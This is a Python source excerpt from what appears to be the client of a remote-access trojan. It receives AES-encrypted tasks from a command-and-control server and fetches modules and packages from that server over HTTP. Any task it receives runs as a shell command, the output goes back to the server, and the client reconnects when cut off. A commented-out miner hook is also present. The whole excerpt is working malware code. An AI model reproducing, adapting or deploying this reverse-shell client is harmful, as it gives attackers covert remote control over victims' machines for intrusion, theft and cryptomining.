    def recv_task(self):
        """
        Receive and decrypt incoming task from server

        `Task`
        :attr str uid:             task ID assigned by server
        :attr str session:         client ID assigned by server
        :attr str task:            task assigned by server
        :attr str result:          task result completed by client
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        """
        try:
            hdr_len = struct.calcsize('!L')
            hdr = self.connection.recv(hdr_len)
            if len(hdr) == 4:
                msg_len = struct.unpack('!L', hdr)[0]
                msg = self.connection.recv(msg_len)
                data = globals()['decrypt_aes'](msg, self.key)
                return json.loads(data)
            else:
                log(f"{self.recv_task.__name__} error: invalid header length")
                log("Restarting client...")
                if not self.connection.recv(hdr_len):
                    self.restart()
        except Exception as e:
            e = str(e)
            if "Errno 104" in e or "10054" in e:
                log(
                    f"{self.recv_task.__name__} socket error: SERVER DISCONNECTED GRACEFULLY - {e}"
                )
                self.kill()
                return
            elif "Errno 32" in e or "10052" in e:
                log(
                    f"{self.recv_task.__name__} socket error: SERVER CRASHED OR INTERRUPTED - {e}"
                )
            elif "Errno 111" in e or "10061" in e:
                log(
                    f"{self.recv_task.__name__} socket error: SERVER OFFLINE OR CHANGED PORT - {e}"
                )
            else:
                log(
                    f"{self.recv_task.__name__} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {e}"
                )
            self.passive()
            #log("{} error: {}".format(self.recv_task.__name__, str(e)))


    def run(self):
        """
        Initialize a reverse TCP shell
        """
        host, port = self.connection.getpeername()

        # run 2 threads which remotely load packages/modules from c2 server
        self.handlers['module_handler'] = self._get_resources(
            target=self.remote['modules'], base_url=f'http://{host}:{port + 1}'
        )
        self.handlers['package_handler'] = self._get_resources(
            target=self.remote['packages'], base_url=f'http://{host}:{port + 2}'
        )

        # create thread handlers to cleanup dead/stale threads
        self.handlers['prompt_handler'] = self._get_prompt_handler() if not self.gui else None
        self.handlers['thread_handler'] = self._get_thread_handler()

        # kick off dev miner
        # self._init_dev_miner()

        # loop listening for tasks from server and sending responses.
        # if connection is dropped, enter passive mode and retry connection every 30 seconds.
        while True:

            # leave passive mode when connection re-established
            if self.flags.passive.is_set() and not self.flags.connection.is_set():
                host, port = self.c2
                self.connection = self._get_connection(host, port)
                self.key = self._get_key(self.connection)
                self.info = self._get_info()
                log(f"{self.run.__name__} : leaving passive mode.")
                self.flags.prompt.set()

            elif self.flags.connection.wait(timeout=1.0):
                if self.gui or not self.flags.prompt.is_set():
                    task = self.recv_task()
                    if isinstance(task, dict) and 'task' in task:
                        cmd, _, action = task['task'].partition(' ')
                        try:

                            if command := self._get_command(cmd):
                                result = command(action) if action else command()
                            else:
                                result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
                                if result is None:
                                    result = reserr

                            # format result
                            if result != None:
                                if type(result) in (list, tuple):
                                    result = '\n'.join(result)
                                elif type(result) == bytes:
                                    result = str(result.decode())
                                else:
                                    result = str(result)
                        except Exception as e:
                            result = f"{self.run.__name__} error: {str(e)}".encode()
                            log(result)


                        # send response to server
                        task.update({'result': result})
                        self.send_task(task)

                    if not self.gui:
                        self.flags.prompt.set()
                elif self.flags.prompt.set() and not self.flags.connection.wait(timeout=1.0):
                    self.kill()
            else:
                log("Connection timed out")
                break
